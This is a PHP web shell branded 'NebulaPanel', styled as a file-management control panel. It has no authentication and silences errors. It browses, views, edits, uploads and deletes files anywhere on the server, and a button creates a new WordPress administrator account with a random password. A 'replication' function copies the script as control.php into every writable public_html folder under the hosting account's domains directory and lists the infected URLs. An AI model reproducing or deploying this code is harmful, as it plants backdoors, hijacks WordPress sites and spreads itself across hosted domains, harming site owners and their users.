<?php
/*
 * 🚀 NebulaPanel - Cosmic Control Interface
 * 📌 Location: Control panel for digital cosmos management
 * ⚡ Features: File explorer, WordPress admin creation, replication protocol
 * 🔧 Version: 1.0 (Cosmic Edition)
 */

error_reporting(0); // Silence execution alerts

// === Core Variables
$cwd = isset($_GET['p']) ? realpath($_GET['p']) : getcwd();
if (!$cwd || !is_dir($cwd)) $cwd = getcwd();

// === Deletion Handler
if (isset($_GET['del'])) {
    $t = realpath($_GET['del']);
    if (strpos($t, getcwd()) === 0 && file_exists($t)) {
        is_dir($t) ? rmdir($t) : unlink($t);
        echo "<div class='alert danger'>🗑️ Removed: " . basename($t) . "</div>";
    }
}

// === WordPress Admin Creation with Random Password
if (isset($_GET['wp'])) {
    $wppath = $cwd;
    while ($wppath !== '/') {
        if (file_exists("$wppath/wp-load.php")) break;
        $wppath = dirname($wppath);
    }
    
    if (file_exists("$wppath/wp-load.php")) {
        require_once("$wppath/wp-load.php");
        $user = 'admin_' . substr(md5(time()), 0, 6);
        $pass = generateRandomPassword();
        $mail = $user . '@' . substr(md5($wppath), 0, 8) . '.com';
        
        if (!username_exists($user) && !email_exists($mail)) {
            $uid = wp_create_user($user, $pass, $mail);
            $wp_user = new WP_User($uid);
            $wp_user->set_role('administrator');
            
            // Display credentials to user
            echo "<div class='alert success'>✅ WordPress Admin Created<br>";
            echo "<strong>Username:</strong> $user<br>";
            echo "<strong>Password:</strong> $pass<br>";
            echo "<strong>Email:</strong> $mail</div>";
        } else {
            echo "<div class='alert warning'>⚠️ User already exists in database</div>";
        }
    } else {
        echo "<div class='alert danger'>❌ WordPress installation not found</div>";
    }
}

// === Random Password Generator
function generateRandomPassword($length = 12) {
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
    $password = '';
    $chars_length = strlen($chars);
    
    for ($i = 0; $i < $length; $i++) {
        $password .= $chars[random_int(0, $chars_length - 1)];
    }
    
    return $password;
}

// === Replication Module
function replicate($code) {
    static $once = false;
    if ($once) return [];
    $once = true;
    
    $start = __DIR__;
    while ($start !== '/') {
        if (preg_match('/\/u[\w]+$/', $start) && is_dir("$start/domains")) {
            $urls = [];
            foreach (scandir("$start/domains") as $dom) {
                if ($dom === '.' || $dom === '..') continue;
                $pub = "$start/domains/$dom/public_html";
                if (is_writable($pub)) {
                    $path = "$pub/control.php";
                    if (file_put_contents($path, $code)) {
                        $urls[] = "http://$dom/control.php";
                    }
                }
            }
            return $urls;
        }
        $start = dirname($start);
    }
    return [];
}

// === Navigation Breadcrumbs
function nav($p) {
    $out = "<div class='breadcrumbs'>📂 Path: ";
    $parts = explode('/', trim($p, '/'));
    $build = '/';
    foreach ($parts as $seg) {
        $build .= "$seg/";
        $out .= "<a href='?p=" . urlencode($build) . "'>$seg</a>/";
    }
    return $out . "</div>";
}

// === File Explorer
function explorer($p) {
    $items = scandir($p);
    $dirs = $files = "";
    foreach ($items as $i) {
        if ($i == "." || $i == "..") continue;
        
        $full = "$p/$i";
        $ext = strtolower(pathinfo($i, PATHINFO_EXTENSION));
        
        $icon = "📄";
        $color = "default";
        
        if (is_dir($full)) {
            $icon = "📁";
            $color = "dir";
        } elseif ($ext == 'php') {
            $icon = "⚙️";
            $color = "php";
        } elseif ($ext == 'txt' || $ext == 'md') {
            $icon = "📝";
            $color = "text";
        } elseif ($ext == 'js') {
            $icon = "📜";
            $color = "js";
        } elseif ($ext == 'css') {
            $icon = "🎨";
            $color = "css";
        } elseif ($ext == 'jpg' || $ext == 'png' || $ext == 'gif') {
            $icon = "🖼️";
            $color = "image";
        }
        
        if (is_dir($full)) {
            $dirs .= "<li class='item $color'>
                $icon <a href='?p=" . urlencode($full) . "'>$i</a>
                <a class='delete' href='?del=" . urlencode($full) . "' onclick='return confirm(\"Delete directory?\")'>✕</a>
            </li>";
        } else {
            $files .= "<li class='item $color'>
                $icon <a href='?p=" . urlencode($p) . "&v=" . urlencode($i) . "'>$i</a>
                <a class='edit' href='?p=" . urlencode($p) . "&e=" . urlencode($i) . "'>✎</a>
                <a class='delete' href='?del=" . urlencode($full) . "' onclick='return confirm(\"Delete file?\")'>✕</a>
            </li>";
        }
    }
    return "<div class='explorer'><ul>$dirs$files</ul></div>";
}

// === View/Edit Files
if (isset($_GET['v'])) {
    $f = basename($_GET['v']);
    echo "<div class='viewer'>
        <h3>🔍 Viewing: $f</h3>
        <pre>" . htmlspecialchars(file_get_contents("$cwd/$f")) . "</pre>
    </div>";
}
if (isset($_GET['e'])) {
    $f = basename($_GET['e']);
    $path = "$cwd/$f";
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        file_put_contents($path, $_POST['data']);
        echo "<div class='alert success'>✅ File updated successfully</div>";
    }
    $src = htmlspecialchars(file_get_contents($path));
    echo "<div class='editor'>
        <h3>✏️ Editing: $f</h3>
        <form method='post'>
            <textarea name='data' rows='20'>$src</textarea><br>
            <button class='btn save'>💾 Save Changes</button>
        </form>
    </div>";
}

// === Upload/Create Handlers
if ($_FILES) {
    move_uploaded_file($_FILES['upload']['tmp_name'], "$cwd/" . basename($_FILES['upload']['name']));
    echo "<div class='alert success'>📤 File uploaded successfully</div>";
}
if (!empty($_POST['mk'])) {
    $d = "$cwd/" . basename($_POST['mk']);
    if (!file_exists($d)) {
        mkdir($d);
        echo "<div class='alert success'>📁 Directory created</div>";
    } else {
        echo "<div class='alert warning'>⚠️ Directory already exists</div>";
    }
}

// === UI Render
echo "<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <title>NebulaPanel - Control Interface</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: #e0e0ff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
            min-height: 100vh;
        }
        .container {
            display: flex;
            flex-direction: column;
            max-width: 1200px;
        }
        .header {
            background: rgba(30, 30, 60, 0.9);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #4a4a8a;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }
        .controls {
            background: rgba(40, 40, 80, 0.9);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            align-items: center;
        }
        .breadcrumbs {
            background: rgba(50, 50, 90, 0.8);
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            border-left: 4px solid #6c5ce7;
        }
        .explorer {
            background: rgba(30, 30, 60, 0.9);
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
        }
        .explorer ul {
            list-style: none;
        }
        .item {
            padding: 10px 15px;
            margin: 5px 0;
            background: rgba(50, 50, 90, 0.6);
            border-radius: 5px;
            display: flex;
            align-items: center;
            transition: all 0.3s ease;
            border: 1px solid transparent;
        }
        .item:hover {
            background: rgba(70, 70, 120, 0.8);
            border-color: #6c5ce7;
            transform: translateX(5px);
        }
        .item a {
            margin: 0 10px;
            color: #a0a0ff;
            text-decoration: none;
        }
        .item a:hover {
            color: #ffffff;
        }
        .btn {
            background: linear-gradient(45deg, #6c5ce7, #a29bfe);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        .btn:hover {
            background: linear-gradient(45deg, #5b4fcf, #9188fd);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(108, 92, 231, 0.4);
        }
        .btn.wp {
            background: linear-gradient(45deg, #00b894, #00cec9);
        }
        .btn.wp:hover {
            background: linear-gradient(45deg, #00a085, #00b7b2);
        }
        .btn.save {
            background: linear-gradient(45deg, #0984e3, #74b9ff);
        }
        .btn.save:hover {
            background: linear-gradient(45deg, #0870c1, #5ca8ff);
        }
        input[type='text'],
        input[type='file'] {
            padding: 10px;
            background: rgba(30, 30, 60, 0.8);
            border: 1px solid #4a4a8a;
            border-radius: 6px;
            color: #e0e0ff;
            min-width: 250px;
        }
        textarea {
            width: 100%;
            padding: 15px;
            background: rgba(20, 20, 40, 0.9);
            border: 1px solid #4a4a8a;
            border-radius: 8px;
            color: #e0e0ff;
            font-family: monospace;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 10px;
        }
        .alert {
            padding: 15px;
            margin: 15px 0;
            border-radius: 6px;
            border-left: 4px solid;
        }
        .alert.success {
            background: rgba(46, 204, 113, 0.2);
            border-color: #2ecc71;
            color: #a8ffc9;
        }
        .alert.warning {
            background: rgba(243, 156, 18, 0.2);
            border-color: #f39c12;
            color: #ffeaa7;
        }
        .alert.danger {
            background: rgba(231, 76, 60, 0.2);
            border-color: #e74c3c;
            color: #ffb8b8;
        }
        .viewer, .editor {
            background: rgba(30, 30, 60, 0.9);
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            border: 1px solid #4a4a8a;
        }
        h1 {
            color: #a29bfe;
            margin-bottom: 10px;
            font-size: 28px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        h2 {
            color: #74b9ff;
            margin: 15px 0;
            font-size: 20px;
        }
        h3 {
            color: #dfe6e9;
            margin-bottom: 15px;
        }
        pre {
            background: rgba(20, 20, 40, 0.9);
            padding: 15px;
            border-radius: 6px;
            overflow-x: auto;
            border: 1px solid #4a4a8a;
        }
        .edit {
            color: #74b9ff;
            margin-left: 10px;
        }
        .delete {
            color: #ff7675;
            margin-left: 10px;
        }
        .dir { color: #fdcb6e; }
        .php { color: #74b9ff; }
        .text { color: #00cec9; }
        .js { color: #ffeaa7; }
        .css { color: #a29bfe; }
        .image { color: #fd79a8; }
        .default { color: #dfe6e9; }
        .urls {
            background: rgba(40, 40, 80, 0.9);
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            border: 1px solid #4a4a8a;
        }
        .urls a {
            color: #74b9ff;
            text-decoration: none;
        }
        .urls a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class='container'>
        <div class='header'>
            <h1>🚀 NebulaPanel</h1>
            <p>Control interface for digital asset management</p>
        </div>";

echo nav($cwd);

// === WordPress Admin Creation Button
echo "<div class='controls'>
        <form method='get'>
            <input type='hidden' name='p' value='" . htmlspecialchars($cwd) . "'>
            <button type='submit' name='wp' value='1' class='btn wp'>👑 Create WordPress Admin</button>
        </form>";

// === Replication Module Execution
if (basename(__FILE__) !== 'control.php') {
    $urls = replicate(file_get_contents(__FILE__));
    if (!empty($urls)) {
        echo "<div class='urls'>
                <strong>🌐 Replicated instances:</strong><br>";
        foreach ($urls as $u) {
            echo "<a href='$u' target='_blank'>$u</a><br>";
        }
        echo "</div>";
    }
}

echo "</div>";

// === File Operations
echo "<div class='controls'>
        <form method='post' enctype='multipart/form-data'>
            <input type='file' name='upload'>
            <button type='submit' class='btn'>📤 Upload File</button>
        </form>
        
        <form method='post' style='display: flex; gap: 10px; align-items: center;'>
            <input type='text' name='mk' placeholder='New directory name'>
            <button type='submit' class='btn'>📁 Create Directory</button>
        </form>
    </div>";

echo explorer($cwd);

echo "</div></body></html>";
?>